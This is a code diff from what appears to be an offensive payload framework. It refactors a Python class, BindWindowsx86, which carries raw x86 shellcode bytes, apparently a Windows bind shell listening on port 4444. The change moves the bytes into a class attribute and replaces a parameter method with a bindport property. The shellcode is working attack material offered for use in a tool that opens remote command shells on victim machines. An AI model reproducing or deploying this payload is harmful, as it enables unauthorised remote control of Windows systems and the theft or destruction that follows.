@@ -4,11 +4,8 @@ from shells import shellsindex
 
 
 class BindWindowsx86(payloadcore.Payload):
-
     AUTHOR: str = "Danakane"
-
-    def __init__(self):
-        payloadbin = b"\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13" \
+    PAYLOAD: bytes = b"\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13" \
                      b"\x85\xdd\x9b\xf7\x83\xeb\xfc\xe2\xf4\x79\x35\x19\xf7" \
                      b"\x85\xdd\xfb\x7e\x60\xec\x5b\x93\x0e\x8d\xab\x7c\xd7" \
                      b"\xd1\x10\xa5\x91\x56\xe9\xdf\x8a\x6a\xd1\xd1\xb4\x22" \
@@ -36,11 +33,13 @@ class BindWindowsx86(payloadcore.Payload):
                      b"\x51\x10\x60\x06\x08\x50\xe1\x9d\x8b\x8f\x5d\x60\x17" \
                      b"\xf0\xd8\x20\xb0\x96\xaf\xf4\x9d\x85\x8e\x64\x22"
 
+    def __init__(self):
         super(BindWindowsx86, self).__init__()
-        self.customize(payloadbin, shellsindex.ShellsIndex.basicbind, "4444")  # 4444 = bind port
+        self.customize(BindWindowsx86.PAYLOAD, shellsindex.ShellsIndex.basicbind, {})
 
-    def parseparameters(self, host: str, port: int) -> bytes:
-        return self.binary()
+    @property
+    def bindport(self) -> int:  # 4444 = bind port
+        return 4444
 
 
 blueprint: typing.Callable = BindWindowsx86
